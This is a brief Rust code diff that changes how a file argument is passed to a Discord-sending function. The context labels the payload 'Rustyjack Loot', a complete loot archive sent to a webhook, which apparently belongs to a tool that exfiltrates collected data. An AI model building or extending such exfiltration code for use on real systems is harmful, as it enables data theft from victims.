@@ -586,7 +586,7 @@ impl App {
         let args = DiscordSendArgs {
             title: "Rustyjack Loot".to_string(),
             message: Some("Complete loot archive".to_string()),
-            file: Some(archive_path.clone()),
+            file: vec![archive_path.clone()],
             target: Some(webhook.clone()),
             interface: None,
         };
